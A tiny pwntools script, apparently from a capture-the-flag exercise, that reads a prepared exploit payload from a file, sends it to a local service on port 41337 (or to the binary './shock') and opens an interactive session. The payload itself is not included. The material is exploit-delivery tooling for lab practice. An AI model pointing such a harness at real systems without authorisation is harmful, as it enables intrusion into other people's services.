from pwn import *

x = open('t', 'rb').read()

p = remote('127.0.0.1', 41337)
#p = process('./shock')
p.sendline(x)
p.interactive()
